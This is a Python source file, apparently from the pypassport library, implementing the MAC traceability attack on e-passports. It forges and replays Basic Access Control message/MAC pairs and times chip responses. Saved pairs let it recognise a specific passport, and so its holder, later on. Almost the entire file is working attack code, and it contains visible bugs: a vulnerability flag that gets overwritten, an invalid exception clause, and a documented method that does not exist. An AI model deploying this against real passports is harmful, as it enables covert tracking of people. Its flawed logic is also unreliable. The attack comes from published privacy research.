import os
import time
import math
import logging

from pypassport import apdu
from pypassport.iso7816 import ISO7816, ISO7816Exception
from pypassport.doc9303.bac import BAC, BACException
from pypassport.reader import ReaderException
from pypassport.doc9303.mrz import MRZ
from pypassport.apdu import ResponseAPDU
from pypassport.hexfunctions import hexToHexRep, binToHexRep

class MacTraceabilityException(Exception):
    def __init__(self, *params):
        Exception.__init__(self, *params)

class MacTraceability():
    """
    This class performs a MAC traceability attack discovered by Tom Chothia and Vitaliy Smirnov from the University of Birmingham.
    This attack can identify a passport based on a message/MAC APDU forged during a legitimate BAC.
    The two main methods are:
        - I{isVUlnerable}, it checks whether a passport is vulnerable to this attack or not.
        - I{exploit}, it exploits the vulnerability.
    """

    def __init__(self, iso7816, mrz=None):
        logging.info("MAC TRACEABILITY")
        self._iso7816 = iso7816

        if type(mrz) == type("") or type(mrz) == type(b""):
            self._mrz = MRZ(mrz)
            if not self._mrz.checkMRZ():
                raise MacTraceabilityException("Unvalid MRZ provided: the provided string is not a valid MRZ.")

        elif type(mrz) == type(MRZ("")):
            self._mrz = mrz
        else:
            raise MacTraceabilityException("Unvalid MRZ provided: Could be either a string, a bytearray or a MRZ object.")

        if type(self._iso7816) != type(ISO7816(None)):
            raise MacTraceabilityException("The sublayer iso7816 is not available")

        self._iso7816.rstConnection()

        self._bac = BAC(iso7816)

    def isVulnerable(self, CO=1.7):
        """Check whether a passport is vulnerable:
            - Initiate a legitimate BAC and store a pair of message/MAC
            - Reset a BAC with a random number for mutual authentication and store the answer together with the response time
            - Reset a BAC and use the pair of message/MAC from step 1 and store the answer together with the response time

        If answers are different, this means the passport is vulnerable.
        If not, the response time is compared. If the gap is wide enough, the passport might be vulnerable.

        Note: The French passport (and maybe others) implemented a security against brute forcing:
        anytime the BAC fails, an incremented delay occurs before responding.
        That's the reson why we need to establish a proper BAC to reset the delay to 0
        Note 2: The default cut-off set to 1.7ms is based on the paper from Tom Chotia and Vitaliy Smirnov:
        A traceability Attack Against e-Passport.
        They figured out a 1.7 cut-off suits for every country they assessed without raising low rate of false-positive and false-negative

        @param CO: The cut-off used to determine whether the response time is long enough to considerate the passport as vulnerable
        @type CO: an integer that represents the cut-off in milliseconds

        @return: A boolean where True means that the passport seems to be vulnerable and False means it doesn't
        """
        cmd_data = self._getPair()
        self.rstBAC()
        (ans1, res_time1) = self._sendPair()
        self.rstBAC()
        (ans2, res_time2) = self._sendPair(cmd_data)

        
        comment = "Cut-off: {} Wrong MAC: SW1:{} SW2:{} - Wrong cipher: SW1:{} SW2:{}".format((res_time2-res_time1)*1000, ans1.sw1, ans1.sw2, ans2.sw1, ans2.sw2)

        if ans1.res != ans2.res or ans1.sw1 != ans2.sw1 or ans1.sw2 != ans2.sw2:
            logging.info("Vulnerable: Response is different")
            vulnerable = True
        if (res_time2 - res_time1) > (CO/1000):
            logging.info("It seems to be vulnerable based on the long response time. Verify if this is consistent and fine tune the cut-off threshold if that seems too low...")
            vulnerable = True
        else:
            logging.info("Does not seem to be vulnerable. Maybe fine tune the cut-off threshold...")
            vulnerable = False

        logging.info("Error message with wrong MAC: [{0}][{1}]".format(ans1.sw1, ans1.sw2))
        logging.info("Error message with correct MAC: [{0}][{1}]".format(ans2.sw1, ans2.sw2))
        logging.info("Response time with wrong MAC: {0} s".format(res_time1))
        logging.info("Response time with correct MAC: {0} s".format(res_time2))

        return (vulnerable, comment)

    def demo(self, CO=1.7, validate=3):
        """Here is a little demo to show how accurate is the traceability attack.
        Please note that the French passport will most likely output a false positive because of the anti brute forcing delay.

        @param CO: The cut-off used to determine whether the response time is long enough to considerate the passport as vulnerable
        @type CO: an integer that represents the cut-off in milliseconds
        @param valisate: check 3 time before validate the passport as identified
        @type validate: An integer that represents the number of validation

        @return: A boolean True whenever the initial passport is on the reader
        """

        cmd_data = self._getPair()
        time.sleep(5)

        i=0
        while i<validate:

            ans1 = ans2 = [""]
            res_time1 = res_time2 = 0

            try:
                self._iso7816.rstConnection()

                try: (ans1, res_time1) = self._sendPair()
                except ReaderException: pass

                try: (ans2, res_time2) = self._sendPair(cmd_data)
                except ReaderException: pass

            except ISO7816Exception:
                pass

            if ans1[0] != ans2[0]:
                i+=1
            elif (res_time2 - res_time1) > (CO/1000):
                i+=1

        return True

    def savePair(self, path=".", filename="pair"):
        """savePair stores a message with its valid MAC in a file.
        The pair can be used later, in a futur attack, to define if the passport is the one that creates the pair (See checkFromFile()).
        If the path doesn't exist, the folders and sub-folders will be created..
        If the file exists, a number will be add automatically.

        @param path: The path where the file has to be created. It can be relative or absolute.
        @type path: A string (e.g. "/home/doe/" or "foo/bar")
        @param filename: The name of the file where the pair will be saved
        @type filename: A string (e.g. "belgian-pair" or "pair.data")

        @return: the path and the name of the file where the pair has been saved.
        """
        if not os.path.exists(path): os.makedirs(path)
        if os.path.exists(os.path.join(path, filename)):
            i = 0
            while os.path.exists(os.path.join(path, filename+str(i))):
                i += 1
            fullpath = os.path.join(path, filename+str(i))
        else:
            fullpath = os.path.join(path, filename)
        
        cmd_data = self._getPair()
        with open(fullpath, 'wb') as pair:
            pair.write(cmd_data)
        return fullpath

    def checkFromFile(self, path=os.path.join(".", "pair"), CO=1.7):
        """checkFromFile read a file that contains a pair and check if the pair has been capture from the passport .

        @param path: The path of the file where the pair has been saved.
        @type path: A string (e.g. "/home/doe/pair" or "foo/bar/pair.data")
        @param CO: The cut-off used to determine whether the response time is long enough to considerate the passport as vulnerable
        @type CO: an integer that represents the cut-off in milliseconds

        @return: A boolean where True means that the passport is the one who creates the pair in the file.
        """
        if not os.path.exists(path): raise MacTraceabilityException("The pair file doesn't exist (path={0})".format(path))
        with open(path, 'rb') as pair:
            cmd_data = pair.read()

        belongs = False
        (ans1, res_time1) = self._sendPair()
        (ans2, res_time2) = self._sendPair(cmd_data)

        if ans1[0] != ans2[0]:
            belongs = True

        elif (res_time2 - res_time1) > (CO/1000):
            belongs = True

        return belongs


    def test(self, j, per_delay=10):
        """test is a method developped for analysing the response time of password whenever a wrong command is sent
        French passport has an anti MRZ brute forcing. This method helps to highlight the behaviour

        @param until: Number of wrong messages to send before comparing the time delay
        @type until: An integer
        @param per_delay: How many results to average
        @type per_delay: An integer
        """

        cmd_data = self._getPair()

        i = per_delay
        total = 0
        while i>0:
            self.rstBAC()
            k = 0
            while j>k:
                self._sendPair(cmd_data)
                k+=1
            (ans1, res_time1) = self._sendPair(cmd_data)
            (ans2, res_time2) = self._sendPair(cmd_data)
            total += math.fabs(res_time2 - res_time1)
            i-=1
        return total/per_delay


    def setMRZ(self, mrz):
        """Set the MRZ

        @param MRZ: MRZ used for the legitimate BAC
        @type MRZ: A string of the MRZ
        """
        self._mrz = MRZ(mrz)
        if self._mrz.checkMRZ():
            try:
                self._bac.authenticationAndEstablishmentOfSessionKeys(self._mrz)
                self._iso7816.rstConnection()
                return True
            except BACException(msg):
                raise MacTraceabilityException("Wrong MRZ")
        else:
            return False

    def reachMaxDelay(self, nb=13):
        """Send a 13 (or more) wrong pair in order to reach the longest delay
        Note: Useful only for passport with anti MRZ brute forcing security.
        """
        i=nb
        while i>0:
            self._sendPair()
            i-=1

    def rstBAC(self):
        """Establish a legitimate BAC with the passport then reset the connection
        """
        logging.debug("Establish a valid BAC")
        logging.debug("Reset the delay (in french passport)")
        self._iso7816.rstConnection()
        self._bac.authenticationAndEstablishmentOfSessionKeys(self._mrz)
        self._iso7816.rstConnection()

    def _getPair(self):
        """Get a message with a valid MAC (regarding the derived Kmac from the MRZ)

        @return: A valid binary message/MAC APDU
        """

        logging.debug("Get a message with a valid MAC")
        logging.debug("MRZ: " + self._mrz.getMrz())

        self._bac.derivationOfDocumentBasicAccesKeys(self._mrz)
        rnd_icc = self._iso7816.getChallenge()
        logging.debug("RND.ICC: " + binToHexRep(rnd_icc))
        cmd_data = self._bac.authentication(rnd_icc)
        logging.debug("The valid pair:" + binToHexRep(cmd_data))
        logging.debug("RST connection")
        self._iso7816.rstConnection()
        return cmd_data


    def _sendPair(self, cmd_data=None):
        """Send a message/MAC.
        If the cmd_data is not set, it sends a random pair in order to make sure the MAC check fails
        If set, a wrong message is sent together with a valid MAC in order to pass the MAC check

        @param cmd_data: pair to send
        @type cmd_data: a string of the raw data to send

        @return: The response time together with error message
        """
        self._iso7816.getChallenge()

        if cmd_data == None:
            logging.debug("Send a message with a wrong MAC")
            logMsg = "Wrong MAC"
            data = binToHexRep("\x55"*40)
        else:
            logging.debug("Send a message with a correct MAC")
            logMsg = "Correct MAC"
            data = binToHexRep(cmd_data)

        toSend = self._iso7816.mutualAuthentication(data=data)
        starttime = time.time()
        try:
            response = self._iso7816.transmit(toSend, logMsg)
            response = ResponseAPDU(response, 0x90, 0x00)
        except ISO7816Exception as msg:
            response = ResponseAPDU(msg.description, msg.sw1, msg.sw2)
        timetaken =  time.time() - starttime
        logging.debug("Response time:" + str(timetaken))
        logging.debug("RST connection")
        self._iso7816.rstConnection()
        return (response, timetaken)
